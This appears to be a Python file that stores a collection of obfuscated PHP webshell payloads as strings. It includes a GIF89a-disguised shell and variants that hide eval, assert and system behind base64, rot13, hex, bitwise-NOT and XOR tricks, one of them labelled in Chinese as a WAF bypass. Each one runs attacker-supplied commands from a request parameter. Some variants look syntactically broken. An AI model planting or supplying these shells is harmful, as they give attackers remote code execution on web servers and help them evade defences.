muma2='''
GIF89a
<script language='php'>@eval($_POST['cmd'])</script>
'''

muma3='''
<?php 
$a = "ass";
$b = "ert";
$c = $a . $b;
$d="_P"
$e="OST"
$f=$d . $e;
@$c($_POST['cmd']); 
?>
'''

muma4='''
<?php
$arr = array('e', 'v', 'a', 'l');
$func = implode('', $arr);
@$func($_POST['cmd']);
?>
'''
muma5='''
<?php
// base64_decode('ZXZhbCgkX1BPU1RbJ2NtZCddKTs=') 解码后为 eval($_POST['cmd']);
eval(base64_decode('ZXZhbCgkX1BPU1RbJ2NtZCddKTs='));
?>
'''


muma6='''
<?php
$func = str_rot13('nffreg'); // rot13解码后为 assert
@$func($_POST['cmd']);
?>
'''
muma7='''
<?php
$func = "\x65\x76\x61\x6c"; // hex解码后为 eval
@$func($_POST['cmd']);
?>
'''

muma8='''
<?php
// 或者更隐蔽地拼接函数名
$func = 'sys' . 'tem';
call_user_func($func, $_POST['cmd']);
?>
'''

muma9='''
<?php
include('php://input');
?>
// POST请求体中直接发送 PHP 代码，如: <?php system('id'); ?>
'''


muma11='''
<?php
$func = ~"\x9E\x8C\x8C\x9A\x8D\x8B"; // ass
$_ = ~"\xA0\xB8\xBA\xAB";           // _G
@$func($$_['cmd']);
?>
'''


#利用异或绕过waf
muma12='''
//构造p or g
<?php
$_p = ('!'^'~').('+'^'{').('/'^'`').('('^'{').('*'^'~');
$_g =('!'^'~'). ('{'^'<').('%'^'`').('*'^'~');

// 构造 ass
$func = ('!'^'@').('^'^'-'). ('^'^'-').('@'^'%').('^'^',').('^'^'*');

// 执行
@$func($$_g['cmd']);
?>
'''